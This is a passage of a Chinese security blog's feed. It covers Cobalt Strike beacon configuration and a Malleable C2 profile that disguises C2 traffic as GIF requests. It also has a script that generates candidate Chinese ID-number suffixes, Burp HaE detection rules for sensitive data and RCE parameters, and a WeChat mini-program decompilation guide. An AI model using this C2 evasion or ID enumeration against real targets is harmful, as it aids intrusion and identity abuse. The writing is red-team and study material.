ConstHeaders</span><br><span class="line">                                   Accept: *&#x2F;*</span><br><span class="line">                                   Content-Type: text&#x2F;xml</span><br><span class="line">                                   X-Requested-With: XMLHttpRequest</span><br><span class="line">                                   Host: www.amazon.com</span><br><span class="line">                                   ConstParams</span><br><span class="line">                                   sz&#x3D;160x600</span><br><span class="line">                                   oe&#x3D;oe&#x3D;ISO-8859-1;</span><br><span class="line">                                   s&#x3D;3717</span><br><span class="line">                                   dc_ref&#x3D;http%3A%2F%2Fwww.amazon.com</span><br><span class="line">                                   SessionId</span><br><span class="line">                                   parameter &quot;sn&quot;</span><br><span class="line">                                   Output</span><br><span class="line">                                   base64</span><br><span class="line">                                   print</span><br><span class="line">PipeName                         -</span><br><span class="line">DNS_Idle                         - 0.0.0.0</span><br><span class="line">DNS_Sleep                        - 0</span><br><span class="line">SSH_Host                         - Not Found</span><br><span class="line">SSH_Port                         - Not Found</span><br><span class="line">SSH_Username                     - Not Found</span><br><span class="line">SSH_Password_Plaintext           - Not Found</span><br><span class="line">SSH_Password_Pubkey              - Not Found</span><br><span class="line">SSH_Banner                       -</span><br><span class="line">HttpGet_Verb                     - GET</span><br><span class="line">HttpPost_Verb                    - POST</span><br><span class="line">HttpPostChunk                    - 0</span><br><span class="line">Spawnto_x86                      - %windir%\syswow64\rundll32.exe</span><br><span class="line">Spawnto_x64                      - %windir%\sysnative\rundll32.exe</span><br><span class="line">CryptoScheme                     - 0</span><br><span class="line">Proxy_Config                     - Not Found</span><br><span class="line">Proxy_User                       - Not Found</span><br><span class="line">Proxy_Password                   - Not Found</span><br><span class="line">Proxy_Behavior                   - Use IE settings</span><br><span class="line">Watermark                        - 305419896</span><br><span class="line">bStageCleanup                    - False</span><br><span class="line">bCFGCaution                      - False</span><br><span class="line">KillDate                         - 0</span><br><span class="line">bProcInject_StartRWX             - True</span><br><span class="line">bProcInject_UseRWX               - True</span><br><span class="line">bProcInject_MinAllocSize         - 0</span><br><span class="line">ProcInject_PrependAppend_x86     - Empty</span><br><span class="line">ProcInject_PrependAppend_x64     - Empty</span><br><span class="line">ProcInject_Execute               - CreateThread</span><br><span class="line">                                   SetThreadContext</span><br><span class="line">                                   CreateRemoteThread</span><br><span class="line">                                   RtlCreateUserThread</span><br><span class="line">ProcInject_AllocationMethod      - VirtualAllocEx</span><br><span class="line">bUsesCookies                     - True</span><br><span class="line">HostHeader                       -</span><br><span class="line">headersToRemove                  - Not Found</span><br><span class="line">DNS_Beaconing                    - Not Found</span><br><span class="line">DNS_get_TypeA                    - Not Found</span><br><span class="line">DNS_get_TypeAAAA                 - Not Found</span><br><span class="line">DNS_get_TypeTXT                  - Not Found</span><br><span class="line">DNS_put_metadata                 - Not Found</span><br><span class="line">DNS_put_output                   - Not Found</span><br><span class="line">DNS_resolver                     - Not Found</span><br><span class="line">DNS_strategy                     - Not Found</span><br><span class="line">DNS_strategy_rotate_seconds      - Not Found</span><br><span class="line">DNS_strategy_fail_x              - Not Found</span><br><span class="line">DNS_strategy_fail_seconds        - Not Found</span><br></pre></td></tr></table></figure><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><h4 id="从防火墙上限制访问beacon的端口。"><a href="#从防火墙上限制访问beacon的端口。" class="headerlink" title="从防火墙上限制访问beacon的端口。"></a>从防火墙上限制访问beacon的端口。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 443 -j DROP </span><br><span class="line">iptables -I INPUT -s xx.xx.xx.xx -ptcp --dport 443 -j ACCEPT</span><br></pre></td></tr></table></figure><p>重新启动网卡，即可</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112164856353.png" alt="image-20211112164856353" style="zoom:50%;"><h4 id="修改profile文件"><a href="#修改profile文件" class="headerlink" title="修改profile文件"></a>修改profile文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">    set uri_x86 &quot;&#x2F;get32.gif&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;get64.gif&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        parameter &quot;id&quot; &quot;1234&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;SomeValue&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;GIF89a&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次生成请求，进行抓包发现对应信息已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165259063.png" alt="image-20211112165259063"></p><p>再次访问链接,为以下格式</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165737808.png" alt="image-20211112165737808"></p><h4 id="修改源码加密的密钥"><a href="#修改源码加密的密钥" class="headerlink" title="修改源码加密的密钥"></a>修改源码加密的密钥</h4><p>该内容在CobaltStrike二开特征修改中。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.feidao.site/wordpress/?p=4457">http://www.feidao.site/wordpress/?p=4457</a></p><p>[<a href="https://kam1.cc/2021/08/09/Cobalt%20Strike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81%E4%B8%8E%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F/]">https://kam1.cc/2021/08/09/Cobalt%20Strike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81%E4%B8%8E%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F/]</a>(<a href="https://kam1.cc/2021/08/09/Cobalt">https://kam1.cc/2021/08/09/Cobalt</a> Strike隐藏特征与混淆流量/)</p><p><a href="https://www.freebuf.com/articles/endpoint/253322.html">https://www.freebuf.com/articles/endpoint/253322.html</a></p><p><a href="https://paper.seebug.org/1349/">https://paper.seebug.org/1349/</a></p><p><a href="https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA">https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA</a></p><p><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Cobalt-Strike简介&quot;&gt;&lt;a href=&quot;#Cobalt-Strike简介&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike简介&quot;&gt;&lt;/a&gt;Cobalt Strike简介&lt;/h1&gt;&lt;p&gt;Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， &lt;a href=&quot;https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf&quot;&gt;A-team详细介绍使用网址&lt;/a&gt;。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。&lt;/p&gt;
&lt;p&gt;Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动。本章中会概述 Cobalt Strike 的功能集和相关的攻击流程。在本手册的剩余部分中会 详细的讨论这些功能。&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://www.ol4three.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C2" scheme="http://www.ol4three.com/tags/C2/"/>
    
      <category term="Cobalt Strike" scheme="http://www.ol4three.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>常用Dict使用集合</title>
    <link href="http://www.ol4three.com/2021/09/26/WEB/%E5%B8%B8%E7%94%A8Dict%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/"/>
    <id>http://www.ol4three.com/2021/09/26/WEB/%E5%B8%B8%E7%94%A8Dict%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/</id>
    <published>2021-09-26T11:09:06.000Z</published>
    <updated>2021-11-17T07:21:14.473Z</updated>
    
    <content type="html"><![CDATA[<p>身份证后六位：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    date &#x3D; input(&quot;出生日期: &quot;)</span><br><span class="line">    sex &#x3D; &#39;02468&#39; if int(input(&quot;性别(男1女2): &quot;)) % 2 &#x3D;&#x3D; 0 else &#39;13579&#39;  # 性别位</span><br><span class="line">    check &#x3D; &#39;0123456789X&#39;  # 校验位</span><br><span class="line">    other &#x3D; &#39;0123456789&#39;   # 其它位</span><br><span class="line">    nums &#x3D; itertools.product(other, other, sex, check)</span><br><span class="line">    cards &#x3D; []</span><br><span class="line">    for num in nums:</span><br><span class="line">        card &#x3D; date + &quot;&quot;.join(num)</span><br><span class="line">        cards.append(card)</span><br><span class="line">    print(len(cards))</span><br><span class="line">    print(cards)</span><br></pre></td></tr></table></figure><a id="more"></a><p>Hae:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hae</span><br><span class="line"></span><br><span class="line">rules:</span><br><span class="line">- rule:</span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Shiro</span><br><span class="line">    regex: (&#x3D;deleteMe|rememberMe&#x3D;)</span><br><span class="line">    scope: any</span><br><span class="line">    </span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: JSON Web Token</span><br><span class="line">    regex: (ey[A-Za-z0-9_-]&#123;10,&#125;\.[A-Za-z0-9._-]&#123;10,&#125;|ey[A-Za-z0-9_\&#x2F;+-]&#123;10,&#125;\.[A-Za-z0-9._\&#x2F;+-]&#123;10,&#125;)</span><br><span class="line">    scope: any</span><br><span class="line">    </span><br><span class="line">  - color: green</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Swagger UI</span><br><span class="line">    regex: ((swagger-ui.html)|(\&quot;swagger\&quot;:)|(Swagger UI)|(swaggerUi))</span><br><span class="line">    scope: response</span><br><span class="line">    </span><br><span class="line">  type: Fingerprint</span><br><span class="line">- rule:</span><br><span class="line">  - color: yellow</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Email</span><br><span class="line">    regex: (([a-zA-Z0-9][_|\.])*[a-zA-Z0-9]+@([a-zA-Z0-9][-|_|\.])*[a-zA-Z0-9]+\.((?!js|css|jpg|jpeg|png|ico)[a-zA-Z]&#123;2,&#125;))</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Chinese IDCard</span><br><span class="line">    regex: [^0-9]((\d&#123;8&#125;(0\d|10|11|12)([0-2]\d|30|31)\d&#123;3&#125;$)|(\d&#123;6&#125;(18|19|20)\d&#123;2&#125;(0[1-9]|10|11|12)([0-2]\d|30|31)\d&#123;3&#125;(\d|X|x)))[^0-9]</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Chinese Mobile Number</span><br><span class="line">    regex: [^0-9A-Za-z](1(3([0-35-9]\d|4[1-8])|4[14-9]\d|5([\d]\d|7[1-79])|66\d|7[2-35-8]\d|8\d&#123;2&#125;|9[89]\d)\d&#123;7&#125;)[^0-9A-Za-z]</span><br><span class="line">    scope: response body</span><br><span class="line"></span><br><span class="line">- color: cyan</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: Internal IP Address</span><br><span class="line">    regex: [^0-9]((127\.0\.0\.1)|(localhost)|(10\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(172\.((1[6-9])|(2\d)|(3[01]))\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;)|(192\.168\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;))</span><br><span class="line">    scope: response</span><br><span class="line"> </span><br><span class="line"> - color: green</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: MAC Address</span><br><span class="line">    regex: (^([a-fA-F0-9]&#123;2&#125;(:[a-fA-F0-9]&#123;2&#125;)&#123;5&#125;)|[^a-zA-Z0-9]([a-fA-F0-9]&#123;2&#125;(:[a-fA-F0-9]&#123;2&#125;)&#123;5&#125;))</span><br><span class="line">    scope: response</span><br><span class="line"> </span><br><span class="line"> - color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: false</span><br><span class="line">    name: Chinese Bank Card ID</span><br><span class="line">    regex: [^0-9]([1-9]\d&#123;12,18&#125;)[^0-9]</span><br><span class="line">    scope: response</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  type: Basic Information</span><br><span class="line">- rule:</span><br><span class="line">  - color: cyan</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: RCE Paramters</span><br><span class="line">    regex: ((cmd&#x3D;)|(exec&#x3D;)|(command&#x3D;)|(execute&#x3D;)|(ping&#x3D;)|(query&#x3D;)|(jump&#x3D;)|(code&#x3D;)|(reg&#x3D;)|(do&#x3D;)|(func&#x3D;)|(arg&#x3D;)|(option&#x3D;)|</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;身份证后六位：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import itertools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if __name__ &amp;#x3D;&amp;#x3D; &amp;#39;__main__&amp;#39;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    date &amp;#x3D; input(&amp;quot;出生日期: &amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sex &amp;#x3D; &amp;#39;02468&amp;#39; if int(input(&amp;quot;性别(男1女2): &amp;quot;)) % 2 &amp;#x3D;&amp;#x3D; 0 else &amp;#39;13579&amp;#39;  # 性别位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    check &amp;#x3D; &amp;#39;0123456789X&amp;#39;  # 校验位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    other &amp;#x3D; &amp;#39;0123456789&amp;#39;   # 其它位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    nums &amp;#x3D; itertools.product(other, other, sex, check)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    cards &amp;#x3D; []&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for num in nums:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        card &amp;#x3D; date + &amp;quot;&amp;quot;.join(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cards.append(card)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(len(cards))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(cards)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Dict" scheme="http://www.ol4three.com/tags/Dict/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序反编译</title>
    <link href="http://www.ol4three.com/2021/09/13/WEB/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>http://www.ol4three.com/2021/09/13/WEB/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/</id>
    <published>2021-09-13T07:02:14.000Z</published>
    <updated>2021-09-22T08:32:55.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">网易MUMU模拟器</span><br><span class="line">APP文件管理器</span><br><span class="line">微信开发者工具:Stable Build (1.05.2108130)</span><br></pre></td></tr></table></figure><h1 id="获取小程序包"><a href="#获取小程序包" class="headerlink" title="获取小程序包"></a>获取小程序包</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.使用自己手机上的微信打开对应的小程序,可以添加到&quot;我的小程序&quot;</span><br><span class="line">2.打开模拟器的微信并登录</span><br><span class="line">3.在模拟器微信的下拉小程序最近使用历史中打开&quot;你所选的小程序&quot;,如果历史记录中没有就在我的小程序中找一找</span><br><span class="line">4.打开小程序等待加载之后就可以去找源码包了</span><br><span class="line">5.打开对应的文件管理器,进入到以下路径查找源码包(可以根据下载时间区分出你想要的源码包)</span><br><span class="line">6.拷贝到mumu浏览器共享目录</span><br></pre></td></tr></table></figure><p>小程序存放路径如下：/data/data/com.tencent.mm/MicroMsg/…/appbrand/pkg/</p><p>…部分根据时间戳或者单点击一个小程序在进行测试，大部分为03075c115f972899a1b1b8cc70506599这种</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913181136982.png" alt="image-20210913181136982"></p><a id="more"></a><h1 id="反编译小程序"><a href="#反编译小程序" class="headerlink" title="反编译小程序"></a>反编译小程序</h1><p>地址：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p><p>下载后在目录下安装如下依赖：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line">    </span><br><span class="line">npm install css-tree</span><br><span class="line">    </span><br><span class="line">npm install cssbeautify</span><br><span class="line">    </span><br><span class="line">npm install vm2</span><br><span class="line">    </span><br><span class="line">npm install uglify-es</span><br><span class="line">    </span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure><p>使用命令<code>node wuWxapkg.js path_wxapkg</code>进行反编译输出信息如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ node wuWxapkg.js _1900266061_26.wxapkg</span><br><span class="line">Unpack file _1900266061_26.wxapkg...</span><br><span class="line"></span><br><span class="line">Header info:</span><br><span class="line">  firstMark: 0xbe</span><br><span class="line">  unknownInfo:  0</span><br><span class="line">  infoListLength:  1305</span><br><span class="line">  dataLength:  291959</span><br><span class="line">  lastMark: 0xed</span><br><span class="line"></span><br><span class="line">File list info:</span><br><span class="line">  fileCount:  38</span><br><span class="line">Saving files...</span><br><span class="line">Unpack done.</span><br><span class="line">Split app-service.js and make up configs &amp; wxss &amp; wxml &amp; wxs...</span><br><span class="line">deal config ok</span><br><span class="line">deal js ok</span><br><span class="line">deal html ok</span><br><span class="line">deal css ok</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;circle&#x2F;circle.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;wave&#x2F;wave.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;Componet&#x2F;wx-pulltorefresh-view&#x2F;wx-pulltorefresh-view.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;date&#x2F;date.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;exam&#x2F;exam.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;freeclass&#x2F;freeclass.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;grade&#x2F;grade.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;index&#x2F;index.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;index&#x2F;passwd&#x2F;passwd.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;jxpg&#x2F;each.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;jxpg&#x2F;jxpg.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;level&#x2F;level.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;timetable&#x2F;my-modal&#x2F;my-modal.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">Decompile .&#x2F;pages&#x2F;timetable&#x2F;timetable.wxml...</span><br><span class="line">Decompile success!</span><br><span class="line">splitJs: &#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26&#x2F;app-service.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 utils&#x2F;httputils.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 utils&#x2F;util.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 app.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;circle&#x2F;circle.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;wave&#x2F;wave.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 Componet&#x2F;wx-pulltorefresh-view&#x2F;wx-pulltorefresh-view.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;index&#x2F;passwd&#x2F;passwd.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;timetable&#x2F;my-modal&#x2F;my-modal.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;index&#x2F;index.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;grade&#x2F;grade.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;level&#x2F;level.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;timetable&#x2F;timetable.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;freeclass&#x2F;freeclass.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;date&#x2F;date.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;exam&#x2F;exam.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;jxpg&#x2F;jxpg.js</span><br><span class="line">&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26 pages&#x2F;jxpg&#x2F;each.js</span><br><span class="line">Splitting &quot;&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26&#x2F;app-service.js&quot; done.</span><br><span class="line">Guess wxss(first turn)...</span><br><span class="line">Import count info: &#123;&#125;</span><br><span class="line">Guess wxss(first turn) done.</span><br><span class="line">Generate wxss(second turn)...</span><br><span class="line">Generate wxss(second turn) done.</span><br><span class="line">Save wxss...</span><br><span class="line">saveDir: &#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;wxappUnpacker-master&#x2F;_1900266061_26</span><br><span class="line">Split and make up done.</span><br><span class="line">Delete files...</span><br><span class="line">Deleted.</span><br><span class="line"></span><br><span class="line">File done.</span><br><span class="line">Total use: 643.682ms</span><br></pre></td></tr></table></figure><h1 id="工具用法"><a href="#工具用法" class="headerlink" title="工具用法"></a>工具用法</h1><ul><li><code>node wuConfig.js &lt;files...&gt;</code> 将 app-config.json 中的内容拆分到各个文件对应的 .json 和 app.json , 并通过搜索 app-config.json 所在文件夹下的所有文件尝试将 iconData 还原为 iconPath 。</li><li><code>node wuJs.js &lt;files...&gt;</code> 将 app-service.js (或小游戏中的 game.js ) 拆分成一系列原先独立的 javascript 文件，并使用 Uglify-ES 美化，从而尽可能还原编译前的情况。</li><li><code>node wuWxml.js [-m] &lt;files...&gt;</code> 将编译/混合到 page-frame.html ( 或 app-wxss.js ) 中的 wxml 和 wxs 文件还原为独立的、未编译的文件。如果加上<code>-m</code>指令，就会阻止<code>block</code>块自动省略，可能帮助解决一些相关过程的 bug 。</li><li><code>node wuWxss.js &lt;dirs...&gt;</code> 通过获取文件夹下的 page-frame.html ( 或 app-wxss.js ) 和其他 html 文件的内容，还原出编译前 wxss 文件的内容。</li><li><code>node wuWxapkg.js [-o] [-d] [-s=&lt;Main Dir&gt;] &lt;files...&gt;</code> 将 wxapkg 文件解包，并将包中上述命令中所提的被编译/混合的文件自动地恢复原状。如果加上<code>-o</code>指令，表示仅解包，不做后续操作。如果加上<code>-d</code>指令，就会保留编译/混合后所生成的新文件，否则会自动删去这些文件。同时，前面命令中的指令也可直接加在这一命令上。</li></ul><p>ps：<strong>如果想单独执行config、js、wxml、wxss的反编译可以在解包时加-o参数不做后续操作</strong></p><h1 id="导入开发者工具或者打开编辑器进行查看"><a href="#导入开发者工具或者打开编辑器进行查看" class="headerlink" title="导入开发者工具或者打开编辑器进行查看"></a>导入开发者工具或者打开编辑器进行查看</h1><p>打开微信开发者工具,导入项目即可，对应id申请测试就可以</p><ul><li>注意勾选不校验合法域名</li><li>勾掉e6转es5(这个小程序貌似并没有使用es6语法)</li></ul><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184148585.png" alt="image-20210913184148585"></p><p>解包其它小程序可能项目配置略有不同。</p><h1 id="图形化操作"><a href="#图形化操作" class="headerlink" title="图形化操作"></a>图形化操作</h1><p>下载<a href="https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端">https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端</a></p><p>根据自己的版本进行下载安装</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184505518.png" alt="image-20210913184505518"></p><p>打开后直接上传对应的wxapkg文件即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184547303.png" alt="image-20210913184547303"></p><p>可以查看安全日志，并导出压缩包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913184618552.png" alt="image-20210913184618552"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a></p><p><a href="https://github.com/wetools/wept">https://github.com/wetools/wept</a></p><p><a href="https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端">https://github.com/xuedingmiaojun/wxappUnpacker#自助解包客户端</a></p><p><a href="http://xuedingmiao.com/blog/xcx_unpack.html">http://xuedingmiao.com/blog/xcx_unpack.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Mac os 11.2.2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;网易MUMU模拟器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;APP文件管理器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;微信开发者工具:Stable Build (1.05.2108130)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



